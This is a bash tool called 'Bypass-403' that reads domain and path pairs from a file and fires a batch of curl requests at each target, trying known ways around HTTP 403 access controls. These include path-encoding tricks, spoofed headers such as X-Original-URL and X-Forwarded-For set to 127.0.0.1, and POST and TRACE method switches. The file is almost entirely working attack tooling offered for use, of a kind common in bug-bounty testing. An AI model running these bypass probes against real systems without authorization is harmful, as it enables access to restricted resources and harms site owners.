#!/bin/bash

figlet Bypass-403
echo "                                               By Iam_J0ker"
echo "./bypass-403.sh input_file"
echo " "

# Function to perform all the bypass techniques
perform_bypass() {
    local domain=$1
    local path=$2

    echo "Testing ${domain}/${path}"
    
    curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" $domain/$path
    echo "  --> ${domain}/${path}"
    
    curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" $domain/%2e/$path
    echo "  --> ${domain}/%2e/${path}"
    
    curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" $domain/$path/.
    echo "  --> ${domain}/${path}/."
    
    curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" $domain//$path//
    echo "  --> ${domain}//${path}//"
    
    curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" $domain/./$path/./
    echo "  --> ${domain}/./${path}/./"
    
    curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" -H "X-Original-URL: $path" $domain/$path
    echo "  --> ${domain}/${path} -H X-Original-URL: ${path}"
    
    curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" -H "X-Custom-IP-Authorization: 127.0.0.1" $domain/$path
    echo "  --> ${domain}/${path} -H X-Custom-IP-Authorization: 127.0.0.1"
    
    curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" -H "X-Forwarded-For: http://127.0.0.1" $domain/$path
    echo "  --> ${domain}/${path} -H X-Forwarded-For: http://127.0.0.1"
    
    curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" -H "X-Forwarded-For: 127.0.0.1:80" $domain/$path
    echo "  --> ${domain}/${path} -H X-Forwarded-For: 127.0.0.1:80"
    
    curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" -H "X-rewrite-url: $path" $domain
    echo "  --> ${domain} -H X-rewrite-url: ${path}"
    
    curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" $domain/$path%20
    echo "  --> ${domain}/${path}%20"
    
    curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" $domain/$path%09
    echo "  --> ${domain}/${path}%09"
    
    curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" $domain/$path?
    echo "  --> ${domain}/${path}?"
    
    curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" $domain/$path.html
    echo "  --> ${domain}/${path}.html"
    
    curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" $domain/$path/?anything
    echo "  --> ${domain}/${path}/?anything"
    
    curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" $domain/$path#
    echo "  --> ${domain}/${path}#"
    
    curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" -H "Content-Length:0" -X POST $domain/$path
    echo "  --> ${domain}/${path} -H Content-Length:0 -X POST"
    
    curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" $domain/$path/*
    echo "  --> ${domain}/${path}/*"
    
    curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" $domain/$path.php
    echo "  --> ${domain}/${path}.php"
    
    curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" $domain/$path.json
    echo "  --> ${domain}/${path}.json"
    
    curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" -X TRACE $domain/$path
    echo "  --> ${domain}/${path} -X TRACE"
    
    curl -s -o /dev/null -iL -w "%{http_code},%{size_download}" -H "X-Host: 127.0.0.1" $domain/$path
    echo "  --> ${domain}/${path} -H X-Host: 127.0.0.1"
    
    curl -s -o /dev/null -iL -w "%{http_code},%{size_download}" "$domain/$path..;/"
    echo "  --> ${domain}/${path}..;/"
    
    curl -s -o /dev/null -iL -w "%{http_code},%{size_download}" "$domain/$path;/"
    echo "  --> ${domain}/${path};/"
    
    curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" -X TRACE $domain/$path
    echo "  --> ${domain}/${path} -X TRACE"
    
    curl -s -o /dev/null -iL -w "%{http_code},%{size_download}" -H "X-Forwarded-Host: 127.0.0.1" $domain/$path
    echo "  --> ${domain}/${path} -H X-Forwarded-Host: 127.0.0.1"

    echo "Way back machine:"
    curl -s https://archive.org/wayback/available?url=$domain/$path | jq -r '.archived_snapshots.closest | {available, url}'
}

# Main script
if [ "$#" -ne 1 ]; then
    echo "Usage: $0 input_file"
    exit 1
fi

input_file=$1

while IFS= read -r line; do
    domain=$(echo $line | awk '{print $1}')
    path=$(echo $line | awk '{print $2}')
    perform_bypass $domain $path
done < $input_file
